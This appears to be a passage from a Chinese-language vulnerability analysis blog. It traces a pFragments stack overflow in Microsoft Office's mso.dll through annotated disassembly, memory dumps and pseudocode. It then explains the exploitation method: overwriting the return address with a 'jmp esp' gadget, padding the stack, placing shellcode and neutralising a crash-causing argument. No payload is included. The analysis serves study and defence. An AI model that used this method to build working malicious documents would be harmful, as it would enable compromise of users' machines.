   .text:</span>32E141AB                 <span class="keyword">push</span>    <span class="built_in">ebx</span>                              <span class="comment">; arg1: ebx = 0x06454B30(a2)(对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141AC                 <span class="keyword">call</span>    sub_3277BE91                     <span class="comment">; </span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line">        ******************************************************************</span><br><span class="line"></span><br><span class="line">            所属模块: mso.dll</span><br><span class="line">            signed <span class="keyword">int</span> __stdcall sub_3277BE91(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span><br><span class="line"></span><br><span class="line">        ******************************************************************</span><br><span class="line"><span class="symbol">        .text:</span>3277BE91                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                              <span class="comment">;   ebp = 0x0011B1E8</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BE92                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                         <span class="comment">;   ebp = esp = 0x0011B1C0</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BE94                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_0]                 <span class="comment">;   eax = [ebp+8] = [0x0011B1C0+8] = [0x0011B1C8] = 0x06454B30(a1)(对象首地址)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BE97                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">eax</span>]                       <span class="comment">;   ecx = [eax] = [0x06454B30] = 0x72580D38(ole32.dll中的虚表指针)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BE99                 <span class="keyword">push</span>    <span class="built_in">esi</span>                              <span class="comment">;   esi = 0x066A55E0(关键对象首地址)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BE9A                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">ebp</span>+arg_8]                 <span class="comment">;   esi = [ebp+0x10] = [0x0011B1C0+0x10] = [0x0011B1D0] = 0x0D60BF6C(a3)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BE9D                 <span class="keyword">lea</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span>+arg_0]                 <span class="comment">;   edx = ebp+0x8 = 0x0011B1C0+0x8 = 0x0011B1C8(a1地址)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEA0                 <span class="keyword">push</span>    <span class="built_in">edx</span>                              <span class="comment">; arg4: edx = 0x0011B1C8(a1地址)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEA1                 <span class="keyword">push</span>    <span class="built_in">esi</span>                              <span class="comment">; arg3: esi = 0x0D60BF6C(a3)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEA2                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_4]                      <span class="comment">; arg2: [ebp+0xC] = [0x0011B1C0+0xC] = [0x0011B1CC] = 0x1D400000(a2)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEA5                 <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; arg1: eax = 0x06454B30(a1)(对象首地址)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEA6                 <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>+<span class="number">0Ch</span>]              <span class="comment">; ole32.72561D9A,CMemStm::Read(void *,ulong,ulong *)</span></span><br><span class="line">                <span class="comment">; 1D400000  41 61 30 41 61 31 41 61 32 41 61 33 41 61 34 41  Aa0Aa1Aa2Aa3Aa4A</span></span><br><span class="line">                <span class="comment">; 1D400010  61 35 41 61 36 41 61 37 41 61 38 41 61 39 41 62  a5Aa6Aa7Aa8Aa9Ab</span></span><br><span class="line">                <span class="comment">; 1D400020  30 41 62 31 41 62 32 41 62 33 41 62 34 41 62 35  0Ab1Ab2Ab3Ab4Ab5</span></span><br><span class="line">                <span class="comment">; 1D400030  41 62 36 41 62 37 41 62 38 41 62 39 41 63 30 41  Ab6Ab7Ab8Ab9Ac0A</span></span><br><span class="line">                <span class="comment">; 1D400040  63 31 41 63 32 41 63 33 41 63 34 41 63 35 41 63  c1Ac2Ac3Ac4Ac5Ac</span></span><br><span class="line">                <span class="comment">; 1D400050  36 41 63 37 41 63 38 41 63 39 41 64 30 41 64 31  6Ac7Ac8Ac9Ad0Ad1</span></span><br><span class="line">                <span class="comment">; 1D400060  41 64 32 41 64 33 41 64 34 41 64 35 41 64 36 41  Ad2Ad3Ad4Ad5Ad6A</span></span><br><span class="line">                <span class="comment">; 1D400070  64 37 41 64 38 41 64 39 41 65 30 41 65 31 41 65  d7Ad8Ad9Ae0Ae1Ae</span></span><br><span class="line">                <span class="comment">; 1D400080  32 41 65 33 41 65 34 41 65 35 41 65 36 41 65 37  2Ae3Ae4Ae5Ae6Ae7</span></span><br><span class="line">                <span class="comment">; 1D400090  41 65 38 41 65 39 41 66 30 41 66 31 41 66 32 41  Ae8Ae9Af0Af1Af2A</span></span><br><span class="line">                <span class="comment">; 1D4000A0  66 33 41 66 34 41 66 35 41 66 36 41 66 37 41 66  f3Af4Af5Af6Af7Af</span></span><br><span class="line">                <span class="comment">; 1D4000B0  38 41 66 39 41 67 30 41 67 31 41 67 32 41 67 33  8Af9Ag0Ag1Ag2Ag3</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEA9                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">;   eax = 0x0</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEAB                 <span class="keyword">jl</span>      loc_32CE0534                     <span class="comment">;   小于跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEB1                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+arg_0], <span class="built_in">esi</span>                 <span class="comment">;   [ebp+0x8] = [0x0011B1C0+0x8] = [0x0011B1C8] = 0x0001000D,esi = 0x0D60BF6C(a3)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEB4                 <span class="keyword">jnz</span>     loc_32CE053B                     <span class="comment">;   不为0跳转，这里跳转</span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line"><span class="symbol">        .text:</span>32CE053B loc_32CE053B:                           </span><br><span class="line"><span class="symbol">        .text:</span>32CE053B                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">;   eax = 0</span></span><br><span class="line"><span class="symbol">        .text:</span>32CE053D                 <span class="keyword">jmp</span>     loc_3277BEBD                     <span class="comment">;</span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line"><span class="symbol">        .text:</span>3277BEBD loc_3277BEBD:                           </span><br><span class="line"><span class="symbol">        .text:</span>3277BEBD                 <span class="keyword">pop</span>     <span class="built_in">esi</span>                              <span class="comment">;   esi = 0x066A55E0(关键对象首地址)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEBE                 <span class="keyword">pop</span>     <span class="built_in">ebp</span>                              <span class="comment">;   ebp = 0x0011B1E8</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEBF                 <span class="keyword">retn</span>    <span class="number">0Ch</span>                              <span class="comment">;</span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line"><span class="symbol">    .text:</span>32E141B1                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">;   eax = 0x0</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141B3                 <span class="keyword">jz</span>      short loc_32E141C5               <span class="comment">;   为0跳转，这里跳转</span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line"><span class="symbol">    .text:</span>32E141C5 loc_32E141C5:                       </span><br><span class="line"><span class="symbol">    .text:</span>32E141C5                                    </span><br><span class="line"><span class="symbol">    .text:</span>32E141C5                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">;   eax = 0x0</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141C7                 <span class="keyword">jmp</span>     short loc_32E141BE               <span class="comment">; </span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line"><span class="symbol">    .text:</span>32E141BE loc_32E141BE:                           </span><br><span class="line"><span class="symbol">    .text:</span>32E141BE                 <span class="keyword">pop</span>     <span class="built_in">edi</span>                              <span class="comment">;   edi = 0x00020026</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141BF                 <span class="keyword">pop</span>     <span class="built_in">esi</span>                              <span class="comment">;   esi = 0x023A0004, (ASCII "11111111acc84161304161314161324161334161344161354161364161374161384161394162304162314162324162334162")</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141C0                 <span class="keyword">pop</span>     <span class="built_in">ebx</span>                              <span class="comment">;   ebx = 0x02340000</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141C1                 <span class="keyword">leave</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141C2                 <span class="keyword">retn</span>    <span class="number">8</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;经过详细分析，我们可以看到，在<code>sub_32E14136</code>函数中三次调用<code>sub_33287CC1</code>函数，将<code>“1111”</code>、<code>“1111”</code>、<code>“C8AC”</code>分别解析出来，并对<code>先解析出来的“1111”</code>和<code>后解析出来的“1111”</code>进行比较，如果先解析出来的“1111”<code>大于</code>后解析出来的“1111”，则<code>退出</code>，不在执行后面的处理。这样看来，<code>“11111111”</code>中的<code>前4个字节</code>以<code>小端序</code>解析出来的数应该小于<code>后4个字节</code>以<code>小端序</code>解析出来的数，经过测试，<code>“11112222”</code>也是可行的。还有，在地址<code>0x32E14184</code>处的指令，将<code>复制数据长度0xC8AC</code>复制给了<code>关键对象0x066A55E0</code>的成员变量。</p>
<h2 id="0x40-漏洞利用"><a href="#0x40-漏洞利用" class="headerlink" title="0x40 漏洞利用"></a>0x40 漏洞利用</h2><h3 id="0x41-方法一：覆盖返回地址"><a href="#0x41-方法一：覆盖返回地址" class="headerlink" title="0x41 方法一：覆盖返回地址"></a>0x41 方法一：覆盖返回地址</h3><p><strong><code>环境：</code></strong>XP &amp; Office2003</p>
<p>&emsp;&emsp;触发异常的指令<code>“30ED442C rep movsd”</code>位于<code>sub_30ED4406</code>函数中，<code>“rep movsd”</code>指令复制内存数据时的<code>目的地址</code>，是通过<code>sub_30ED4406</code>函数的<code>第二个参数</code>传进来的，它其实是<code>sub_30ED4406</code>函数的<code>父函数sub_30F0B5C2</code>中定义的一个<code>局部变量</code>，所以<code>pFragements属性值数据</code>在<code>栈上的起始地址</code>位于父函数<code>sub_30F0B5C2</code>的<code>栈帧</code>中，我们要覆盖的也是父函数<code>sub_30F0B5C2</code>的<code>返回地址</code>。</p>
<p>&emsp;&emsp;根据<code>前面的分析</code>我们可以知道，当执行到指令<code>“30ED442C rep movsd”</code>处时，<code>栈布局</code>是这样的：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>30ED442C F3 A5        <span class="keyword">rep</span> <span class="keyword">movsd</span>   <span class="comment">; rep movs dword ptr es:[edi],dword ptr [esi]</span></span><br><span class="line">                                    栈数据：</span><br><span class="line">                                    001237B4   01C40824 &lt;-<span class="built_in">esp</span></span><br><span class="line">                                    001237B8   001239A4</span><br><span class="line">                                    001237BC   30F0B5FB  返回到 mso.30F0B5FB</span><br><span class="line">                                    001237C0   01C40824</span><br><span class="line">                                    001237C4   001237DC</span><br><span class="line">                                    001237C8   <span class="number">00000000</span></span><br><span class="line">                                    001237CC   <span class="number">00000000</span></span><br><span class="line">                                    001237D0   <span class="number">00000000</span></span><br><span class="line">                                    001237D4   <span class="number">00000000</span></span><br><span class="line">                                    001237D8   0000FF35</span><br><span class="line">                                    001237DC   FFFF0000 &lt;-pFragments缓冲区起始地址</span><br><span class="line">                                    001237E0   <span class="number">05000000</span></span><br><span class="line">                                    001237E4   <span class="number">00000000</span></span><br><span class="line">                                    001237E8   0000FFFF</span><br><span class="line">                                    001237EC   0012381C &lt;-<span class="built_in">ebp</span></span><br><span class="line">                                    001237F0   30F0B56B  返回到 mso.30F0B56B 来自 mso.30F0B5C2</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;<code>pFragments缓冲区</code>起始地址距保存函数<code>sub_30F0B5C2的返回地址</code>的栈地址的偏移为<code>0x14字节</code>，所以在<code>pFragments属性值</code>中的<code>复制长度</code>之后再填充<code>0x14字节</code>数据，即可覆盖到<code>返回地址</code>。我们这里使用<code>“jmp esp”</code>指令的地址覆盖其<code>返回地址</code>。由于函数<code>sub_30F0B5C2</code>在返回时，会<code>弹出0x14字节</code>的栈空间，所以，返回地址之后不能直接放置<code>Shellcode</code>，需要填充<code>0x14</code>字节的<code>垃圾数据</code>，然后再放置<code>Shellcode</code>。这样，执行<code>“jmp esp”</code>指令的时候，就可以直接跳转到<code>Shellcode</code>执行了。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>30F0B6B8 loc_30F0B6B8:                           <span class="comment">; CODE XREF: sub_30F0B5C2+184C37↓j</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B6B8         <span class="keyword">pop</span>     <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B6B9         <span class="keyword">leave</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B6BA         <span class="keyword">retn</span>    <span class="number">14h</span> &lt;----</span><br><span class="line"><span class="symbol">.text:</span>30F0B6BA sub_30F0B5C2 endp</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;在写<code>Exp</code>的过程中，遇到一个问题。由于复制数据指令<code>“30ED442C rep movsd”</code>的位置距离函数<code>sub_30F0B5C2</code>的返回指令<code>&quot;30F0B6BA retn 14h&quot;</code>还有很多指令需要执行，但是<code>栈</code>已经<code>被破坏</code>了，所以可能会造成这些指令<code>执行异常</code>，我们需要构造<code>关键的数据</code>，使其可以成功执行到函数<code>sub_30F0B5C2</code>的返回指令<code>&quot;30F0B6BA retn 14h&quot;</code>。这些指令会访问调用函数<code>sub_30F0B5C2</code>时，压入栈的<code>参数</code>，也就是我们覆盖的函数<code>sub_30F0B5C2</code>的<code>返回地址</code>之后的<code>0x14字节</code>栈空间。如果我们全用<code>“a”</code>覆盖这片栈空间，就会<code>造成异常</code>，异常信息如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">*************************************************************************************************</span><br><span class="line"></span><br><span class="line">    所属模块: mso.dll</span><br><span class="line">    char __userpurge sub_30F0B5C2@&lt;<span class="built_in">al</span>&gt;(<span class="keyword">int</span> a1@&lt;<span class="built_in">eax</span>&gt;, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> *a5, <span class="keyword">int</span> a6)</span><br><span class="line"></span><br><span class="line">*************************************************************************************************</span><br><span class="line">......</span><br><span class="line"><span class="symbol">.text:</span>30F0B5F8         <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>+<span class="number">1Ch</span>]              <span class="comment">;   sub_30ED4406</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5FB         <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_C]                 <span class="comment">;   eax = [ebp+0x14] = 0x001237ec+0x14] = [0x00123800] = 0xAAAAAAAA(a4)</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5FE         <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_10]                     <span class="comment">; arg3: [ebp+0x18] = 0x001237ec+0x18] = [0x00123804] = 0xAAAAAAAA(a5)</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B601         <span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span>+var_10]                <span class="comment">;   edx = [ebp-0x10] = [0x001237ec-0x10] = [0x001237dc] = 0xAAAAAAAA(pFragements属性值起始内容) &lt;----</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B604         <span class="keyword">neg</span>     <span class="built_in">eax</span>                              <span class="comment">;   求补:按位取反再加一,eax = 0x55555556</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B606         <span class="keyword">sbb</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">;   eax = eax-eax-CF = 0xFFFFFFFF,CF=1</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B608         <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_8]                 <span class="comment">;   ecx = ebp-0x8 = 0x001237ec-0x8 = 0x001237e4</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B60B         <span class="keyword">and</span>     <span class="built_in">eax</span>, <span class="built_in">ecx</span>                         <span class="comment">;   eax = eax&amp;ecx = 0x001237e4</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B60D         <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; arg2: eax = 0x001237e4</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B60E         <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_0]                      <span class="comment">; arg1: [ebp+0x8] = [0x001237ec+0x8] = [0x001237f4] = 0xAAAAAAAA(a1)</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B611         <span class="keyword">call</span>    sub_30F0B7AF                     <span class="comment">; </span></span><br><span class="line"><span class="symbol">.text:</span>30F0B616         <span class="keyword">test</span>    <span class="built_in">al</span>, <span class="built_in">al</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B618         <span class="keyword">jz</span>      loc_30F0B6B6</span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line">    **********************************************************************************************</span><br><span class="line"></span><br><span class="line">        所属模块: mso.dll</span><br><span class="line">        char __userpurge sub_30F0B7AF@&lt;<span class="built_in">al</span>&gt;(<span class="keyword">int</span> a1@&lt;<span class="built_in">edx</span>&gt;, <span class="keyword">int</span> a2@&lt;<span class="built_in">edi</span>&gt;, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5)</span><br><span class="line"></span><br><span class="line">    **********************************************************************************************</span><br><span class="line"><span class="symbol">    .text:</span>30F0B7AF         <span class="keyword">push</span>    <span class="built_in">ebp</span>                              <span class="comment">;   ebp = 0x001237EC</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7B0         <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                         <span class="comment">;   ebp = esp = 0x001237B8</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7B2         <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">10h</span>                         <span class="comment">;   esp = esp-0x10 = 0x001237B8-0x10 = 0x001237A8</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7B5         <span class="keyword">push</span>    <span class="built_in">ebx</span>                              <span class="comment">;   ebx = 0x05000000</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7B6         <span class="keyword">xor</span>     <span class="built_in">ebx</span>, <span class="built_in">ebx</span>                         <span class="comment">;   ebx = ebx^ebx = 0x0</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7B8         <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+arg_8], <span class="built_in">ebx</span>                 <span class="comment">;   [ebp+0x10] = [0x001237B8+0x10] = [0x001237C8] = 0xAAAAAAAA(a3)</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7BB         <span class="keyword">jz</span>      loc_310901D0                     <span class="comment">;   为0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7C1         <span class="keyword">cmp</span>     <span class="built_in">edx</span>, <span class="built_in">ebx</span>                         <span class="comment">; arg2: edx = 0xAAAAAAAA,ebx = 0x0</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7C3         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+lpMem], <span class="built_in">ebx</span>                 <span class="comment">;   [ebp-0xC] = [0x001237B8-0xC] = [0x001237AC] = ebx = 0x0</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7C6         <span class="keyword">jz</span>      short loc_30F0B7D8               <span class="comment">;   为0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7C8         <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+lpMem]                 <span class="comment">; arg1: ecx = ebp-0xc = 0x001237B8-0xC = 0x001237AC</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7CB         <span class="keyword">call</span>    sub_30F0B90A                     <span class="comment">;</span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line">        **************************************************************</span><br><span class="line"></span><br><span class="line">            所属模块: mso.dll</span><br><span class="line">            signed <span class="keyword">int</span> __fastcall sub_30F0B90A(LPVOID *a1, <span class="keyword">int</span> a2)</span><br><span class="line"></span><br><span class="line">        **************************************************************</span><br><span class="line"><span class="symbol">        .text:</span>30F0B90A sub_30F0B90A proc <span class="built_in">near</span>                </span><br><span class="line"><span class="symbol">        .text:</span>30F0B90A                                        </span><br><span class="line"><span class="symbol">        .text:</span>30F0B90A         <span class="keyword">lea</span>     <span class="built_in">eax</span>, (loc_30F0B914+<span class="number">4</span>)[<span class="built_in">edx</span>*<span class="number">8</span>]     <span class="comment">; eax = edx*8+0x30F0B914+4 = 0xAAAAAAAA*8+0x30F0B918 = 0x86460E68(a2,edx) &lt;----</span></span><br><span class="line"><span class="symbol">        .text:</span>30F0B911         <span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">eax</span>+<span class="number">4</span>]                     <span class="comment">; edx = [eax+4] = [0x86460E68+4] = [0x86460E6C] = ??? &lt;----</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;由于<code>pFragements属性值</code>起始的<code>第1个dword</code>会被传进调用<code>CrashFun(sub_30ED4406)</code>函数的指令之后调用的<code>sub_30F0B7AF函数</code>，作为其<code>参数</code>，后面的程序会利用其生成一个<code>不可访问的地址</code>，造成<code>内存访问异常</code>。</p>
<p>&emsp;&emsp;经过对函数<code>sub_30F0B5C2</code>和函数<code>sub_30F0B7AF</code>的伪代码进行分析，结果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> __userpurge sub_30F0B5C2@&lt;al&gt;(<span class="keyword">int</span> a1@&lt;eax&gt;, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> *a5, <span class="keyword">int</span> a6)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">if</span> ( a6 ) <span class="comment">// 进入sub_30F0B5C2函数时,a6 != 0x0</span></span><br><span class="line">    &#123;</span><br><span class="line">        v7 = *(<span class="keyword">int</span> **)(sub_30D29EA3(*(_BYTE **)(a1 + <span class="number">8</span>)) + <span class="number">100</span>);</span><br><span class="line">        v17 = <span class="number">0</span>;</span><br><span class="line">        v8 = *v7;</span><br><span class="line">        v16 = <span class="number">83886080</span>;</span><br><span class="line">        (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">int</span> *, <span class="keyword">int</span> *, <span class="keyword">int</span>))(v8 + <span class="number">28</span>))(v7, &amp;v15, a3); <span class="comment">// sub_30ED4406,a6可被修改为0x0</span></span><br><span class="line">        <span class="comment">// a6 == 0x0,会使sub_30F0B7AF()函数返回0,a6为sub_30F0B5C2()在栈上的第5个参数</span></span><br><span class="line">        <span class="comment">// 并且可以使sub_30F0B5C2()函数直接返回</span></span><br><span class="line">        result = sub_30F0B7AF(a2, a5 != <span class="number">0</span> ? (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v17 : <span class="number">0</span>, a6); </span><br><span class="line">        <span class="keyword">if</span> ( result ) <span class="comment">// result == 0x0,sub_30F0B5C2()函数直接返回</span></span><br><span class="line">        &#123;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        sub_3144D83D();</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> __userpurge sub_30F0B7AF@&lt;al&gt;(<span class="keyword">int</span> a1@&lt;edx&gt;, <span class="keyword">int</span> a2@&lt;edi&gt;, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">if</span> ( !a5 ) <span class="comment">// a5 == 0x0,则直接返回,且返回值为0</span></span><br><span class="line">    &#123;</span><br><span class="line">        sub_3144D83D();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;所以我们只要让函数<code>sub_30F0B5C2</code>在<code>栈</code>上的<code>第5个参数</code>被修改为<code>0x0</code>,则可以让函数<code>sub_30F0B5C2</code>跳过执行完<code>CrashFun(sub_30ED4406)</code>函数之后可能需要执行的代码部分，<code>直接返回</code>。</p>
<p><strong><code>环境：</code></strong>Windows7 &amp; Office2007</p>
<p>&emsp;&emsp;在<code>Win7&amp;Office2007</code>的环境下，和<code>XP&amp;Office2003</code>环境下，基本是一样的，只是<code>关键函数</code>的地址不一样。<code>对应关系</code>如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+---------------------+--------------------+-------------------+</span><br><span class="line">|   XP&amp;Office2003     |   sub_30F0B5C2     |   sub_30F0B7AF    |</span><br><span class="line">|---------------------|--------------------|-------------------|</span><br><span class="line">|   Win7&amp;Office2007   |   sub_32E5955E     |   sub_32E5941B    |</span><br><span class="line">+---------------------+--------------------+-------------------+</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;还有就是所使用的<code>ROPGadgets</code>的地址不一样，也有可能<code>ROPGadgets</code>的地址是相同的，这种比较少。</p>
